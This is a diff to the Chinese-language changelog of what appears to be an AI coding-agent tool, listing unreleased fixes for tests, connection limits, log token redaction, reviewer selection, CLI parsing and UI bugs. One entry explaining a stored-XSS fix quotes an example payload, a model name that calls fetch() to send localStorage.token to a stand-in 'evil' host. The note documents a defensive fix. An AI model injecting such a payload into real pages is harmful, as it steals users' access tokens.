@@ -6,6 +6,8 @@ README 元数据带回，供老版本在「发现新版本」时展示新版更�
 
 ## 未发布
 
+- **「修复后重验」闭环首次有回归保护（P0 质量）**：全仓此前没有任何测试驱动过 `_run_code`，「实现 → 验证 → 修复 → 重验」只被真实跑过。新增 `tests/test_code_repair_reverify.py`（4 项）：`verify_command` 走真实子进程并按调用次数计分（首轮失败是确定性事实，不是打桩），修复提示词必须带上验证失败清单，判据读 verdict 三态与 report.md。覆盖：验证转绿后才判通过、连败修满一轮收口未通过、未配验证命令时验证列写「未执行」而非「通过」、高难度两轮修复且 gate 连败后评审回归。两个变异（三态改回旧行为、修复轮数钳制放大）均被测试抓住。
+
 - **实时连接有上限，不再无限起线程（性能）**：`/api/events` 是唯一常驻长连接，而每个连接独占一个 worker 线程、只在客户端断开时退出。页面反复刷新、多端在线、隧道重连叠旧连接未关，线程数就线性涨（每个还带压缩器和一份状态载荷），长任务大屏逐步变慢，极端情况线程表打满后连 `/api/state` 都拿不到。现在默认上限 32（`CODEBEE_SSE_MAX` 可调），超限返回 503 + `Retry-After`，由 EventSource 自行退避重连。
 
 - **流式预览落盘减半、不再 fsync（性能）**：`stream_step` 原来每 0.6s 在全局锁内全量重写 run.json 并 fsync。实测 4.65MB 的运行记录单次 32ms（峰值 51ms）——长跑任务正好在这个量级，并行任务的写库全排在它后面，而前端 2s 才消费一次。改为 1.2s 节流，预览态不再 fsync（仍是原子写，崩了最多少半秒打字动画，最终值照旧全量落盘）。
@@ -26,13 +28,13 @@ README 元数据带回，供老版本在「发现新版本」时展示新版更�
 
 - **启动输出不再打印访问令牌（P1 安全）**：桌面端把 sidecar 的 stdout 原样写进 `desktop-logs/backend.log`，带 token 的配对地址等于把服务凭据写成可外传的文件——拿到日志就能接管服务、读全部任务产物并 `POST` 建任务。默认打码，完整链接仍可在 UI「手机连接」面板取；纯命令行用户加 `--print-token` 恢复原输出。
 
-- **内联事件处理器参数改用 `jsq()`（P1 安全，堵存储型 XSS）**：`esc()` 是 HTML 转义，`&#39;` 在属性值里会被解码回 `'`，JS 字符串照样闭合。上游 `/v1/models` 返回模型名 `x');fetch('http://evil/'+localStorage.token)//`，经「获取模型列表」落进配置后即可在页面执行。181 处内联处理器参数（模型名、运行产物文件名、git stash ref、平台账号名等）统一换成 `jsq()`，文本节点/`title`/`data-*` 的 `esc()` 不动。
+- **内联事件处理器参数改用 `jsq()`（P1 安全，堵存储型 XSS）**：`esc()` 是 HTML 转义，`&#39;` 在属性值里会被解码回 `'`，JS 字符串照样闭合。上游 `/v1/models` 返回模型名 `x');fetch('http://evil/'+localStorage.token)//`，经「获取模型列表」落进配置后即可在页面执行。181 处内联处理器参数（模型名、运行产物文件名、git stash ref、平台账号名等）统一换成 `jsq()`，文本节点/`title`/`data-*` 的 `esc()` 不动。`jsq()` 另补了换行与 U+2028/U+2029 转义：上游模型名带一个换行，整个 `onclick` 会变成语法错误（按钮点了没反应），比 XSS 更难查。
 
 - **手动模式评审不再同族互评（P1 正确性）**：手动模式走 v1 选择器，只排除作者 id，不看模型族/供应商/上游；作者与下一候选绑定同族模型时，「跨厂商对抗评审」退化成同族同盲区互评且报告无提示。改为与自动/专家模式一致走 `router.pick_reviewer`（隔离候选耗尽时如实回退并写进 `route.reviewer`），并删除失去调用方的 `_pick_reviewer_legacy`。
 
 - **CLI 输出字段类型漂移不再整轮崩溃（P1 可靠性）**：`usage` / `item` / `modelUsage` 只承载统计，旧实现 `ev.get("usage") or {}` 挡不住字符串/数字，`u.get(...)` 抛 `AttributeError` 直接穿出 `run_agent`，错误分类与换将白名单全部失效，用户只看到 traceback。新增 `_obj` / `_int_or_zero` / `_float_or_zero` 收敛点；此前 `cli_parsers` 全仓零测试引用，本次补 8 项基线。
 
-- **ACP 终端命令随会话收尾一起取消（P1 可靠性）**：`terminal/create` 起的命令线程只在 agent 主动 release/kill 时收手，`run_agent` 的 finally 只关连接。agent 先结束会话后，长命令继续在同一工作目录写文件、踩掉下一个任务的改动。改为统一置 cancel + 共享 2s 预算 join，卡死命令返回 id 不无限等。
+- **ACP 终端命令随会话收尾一起取消（P1 可靠性）**：`terminal/create` 起的命令线程只在 agent 主动 release/kill 时收手，`run_agent` 的 finally 只关连接。agent 先结束会话后，长命令继续在同一工作目录写文件、踩掉下一个任务的改动。改为统一置 cancel + 共享 2s 预算 join，卡死命令返回 id 不无限等。命令执行本身抛异常时也必定置 `done` 并把原因写进输出——否则 agent 会在一条早就炸掉的命令上空转到任务时限。
 
 - **对话「返回」后输入框消失治了（主页 composer 困在隐藏 page-home 实案）**：workbench 主页把 `#sub-tasks .cmp-box` 搬进 `#rd-input-slot`（homeMountComposer），而从侧栏点任务行进对话走 `showDetailInMain`——它刻意不走 switchTab（会先 closeRun 抹掉 detailTaskKey），却因此漏掉「离开主页搬回 composer」的契约；对话点「返回」（closeRun 的回任务页分支）也不搬回，`.cmp-box` 困在隐藏的 page-home 里，表单只剩问候语和类型 chips。修法：`showDetailInMain` 进详情时自行 `homeUnmountComposer()`（与 switchTab/exitSettings 同契约，侧栏行/检查器/建任务后跳转等主视图入口全收敛在这一个函数）；新增 tests/test_ui_home_composer_back.py 切片回归（假 DOM 真跑搬运对+进详情路径，变异验证过红）。
 
